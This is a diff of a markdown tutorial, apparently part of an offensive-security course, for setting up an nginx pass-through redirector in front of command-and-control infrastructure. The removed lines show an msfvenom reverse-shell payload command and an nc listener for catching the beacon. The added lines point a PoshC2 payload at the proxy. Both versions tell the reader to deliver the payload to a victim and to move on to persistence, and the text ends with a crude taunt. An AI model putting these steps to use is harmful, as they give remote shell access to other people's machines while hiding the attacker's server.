@@ -5,7 +5,7 @@
     ```bash
     sudo apt install nginx 
     ```
-3. Now lets modify our config file which might no exist 
+3. Now lets create a config file for pass through connections 
     ```bash 
     sudo vim /etc/nginx/conf.d/lp_proxy.conf
     ```
@@ -50,17 +50,11 @@
     ```bash 
     sudo systemctl restart nginx.service
     ```
-7. From here we can now create a msfvenom shell or poshc2 with the correct ports set in the TCP section in the example we have `8080` 
-    ```bash
-   msfvenom -p linux/x64/shell_reverse_tcp LHOST=<proxy-ip> LPORT=8080 -a x64 -f elf > yup.elf
-    ```
-    > **NOTE:** Follow the same setup if you are using Poshc2 set your bind port to 80/443, and in `payloadcomshost` set your `http://proxy-ip:<stream-listening-port>`
+7. From here, create a poshc2 project with the bind port set to 80, and in `payloadcomshost` set your `http://proxy-ip:80`
+
 8. Host your payload however and download on victim 
-9. Now if you are running msfvenom start you `nc` listener to catch your beacon.
-    ```bash
-    sudo nc -lnvp 80
-    ```
-10. tada you have a beacon shelley, fuck you.
+
+9. tada you have a beacon shelley, fuck you.
 
 ## Important Nginx File Locations 
 - `/var/www/html` – Website content as seen by visitors.
@@ -71,4 +65,4 @@
 - `/var/log/nginx/access.log` – Access logs tracking every request to your server.
 - `/var/log/ngins/error.log` – A log of any errors generated in Nginx.
 
-## [Return to course page](README.md)
+## [Return to course page](README.md) or [Go To Next Step](step3-persistence.md)
